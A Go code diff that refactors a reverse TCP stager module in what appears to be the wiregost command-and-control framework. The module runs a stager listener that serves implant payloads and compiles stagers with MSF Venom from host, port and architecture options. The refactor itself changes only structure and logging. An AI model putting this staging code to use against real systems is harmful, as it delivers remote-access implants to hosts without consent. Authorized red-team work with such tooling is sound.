@@ -37,39 +37,23 @@ import (
 	"github.com/maxlandon/wiregost/server/module/templates"
 )
 
-// metadataFile - Full path to module metadata
-var metadataFile = filepath.Join(assets.GetModulesDir(), "payload/multi/stager/reverse_tcp/metadata.json")
-
 // [ Base Methods ] ------------------------------------------------------------------------//
 
 // ReverseTCPStager - A single stage MTLS implant
 type ReverseTCPStager struct {
-	Base *templates.Module
+	*templates.Module
 }
 
 // New - Instantiates a reverse MTLS module, empty.
 func New() *ReverseTCPStager {
-	return &ReverseTCPStager{Base: &templates.Module{}}
+	mod := &ReverseTCPStager{&templates.Module{}}
+	mod.Path = []string{"payload/multi/stager/reverse_tcp"}
+	return mod
 }
 
-// Init - Module initialization, loads metadata. ** DO NOT ERASE **
-func (s *ReverseTCPStager) Init() error {
-	return s.Base.Init(metadataFile)
-}
-
-// ToProtobuf - Returns protobuf version of module
-func (s *ReverseTCPStager) ToProtobuf() *pb.Module {
-	return s.Base.ToProtobuf()
-}
-
-// SetOption - Sets a module option through its base object.
-func (s *ReverseTCPStager) SetOption(option, name string) {
-	s.Base.SetOption(option, name)
-}
+var modLog = log.ServerLogger("payload/multi/stager/reverse_tcp", "module")
 
 // [ Module Methods ] ------------------------------------------------------------------------//
-
-var rpcLog = log.ServerLogger("stager_reverse_tcp", "module")
 
 // Run - Module entrypoint. ** DO NOT ERASE **
 func (s *ReverseTCPStager) Run(command string) (result string, err error) {
@@ -87,11 +71,11 @@ func (s *ReverseTCPStager) Run(command string) (result string, err error) {
 }
 
 func (s *ReverseTCPStager) toListener() (result string, err error) {
-	host := s.Base.Options["LHostListener"].Value
+	host := s.Options["LHostListener"].Value
 	if host == "" {
 		return "", errors.New("You must specify a listener LHost")
 	}
-	portUint, err := strconv.Atoi(s.Base.Options["LPortListener"].Value)
+	portUint, err := strconv.Atoi(s.Options["LPortListener"].Value)
 	if err != nil {
 		return "", errors.New("Error parsing listener LPort")
 	}
@@ -101,7 +85,7 @@ func (s *ReverseTCPStager) toListener() (result string, err error) {
 	}
 
 	// Check StageImplant exists, and is the appropriate format
-	implant := s.Base.Options["StageImplant"].Value
+	implant := s.Options["StageImplant"].Value
 	config := &generate.GhostConfig{}
 	ghostBytes := []byte{}
 	if implant == "" {
@@ -157,7 +141,7 @@ func (s *ReverseTCPStager) toListener() (result string, err error) {
 	}
 	go func() {
 		<-job.JobCtrl
-		rpcLog.Infof("Stopping TCP Stager listener (%d) ...", job.ID)
+		modLog.Infof("Stopping TCP Stager listener (%d) ...", job.ID)
 		ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections
 
 		core.Jobs.RemoveJob(job)
@@ -176,11 +160,11 @@ func (s *ReverseTCPStager) toListener() (result string, err error) {
 func (s *ReverseTCPStager) CompileStager() (result string, err error) {
 
 	// Check options
-	host := s.Base.Options["LHostStager"].Value
+	host := s.Options["LHostStager"].Value
 	if host == "" {
 		return "", errors.New("You must specify a stager LHost")
 	}
-	portUint, err := strconv.Atoi(s.Base.Options["LPortStager"].Value)
+	portUint, err := strconv.Atoi(s.Options["LPortStager"].Value)
 	if err != nil {
 		return "", errors.New("Error parsing stager LPort")
 	}
@@ -188,11 +172,11 @@ func (s *ReverseTCPStager) CompileStager() (result string, err error) {
 	if port == 0 {
 		return "", errors.New("Invalid stager LPort")
 	}
-	format := s.Base.Options["OutputFormat"].Value
+	format := s.Options["OutputFormat"].Value
 	if format == "" {
 		return "", errors.New("You must specify a MSF Venom output format")
 	}
-	arch := s.Base.Options["Arch"].Value
+	arch := s.Options["Arch"].Value
 	if arch == "" {
 		return "", errors.New("You must specify a CPU architecture for the Stager")
 	}
@@ -205,13 +189,13 @@ func (s *ReverseTCPStager) CompileStager() (result string, err error) {
 	}
 
 	// If needed, save the payload
-	save := s.Base.Options["FileName"].Value
+	save := s.Options["FileName"].Value
 	if save != "" || format == "raw" {
 		filename := ""
 		if save == "" {
 			// We need a default name, so this code is needed
-			implant := s.Base.Options["StageImplant"].Value
-			configName := s.Base.Options["StageConfig"].Value
+			implant := s.Options["StageImplant"].Value
+			configName := s.Options["StageConfig"].Value
 			config := &generate.GhostConfig{}
 			if configName == "" {
 				if implant == "" {
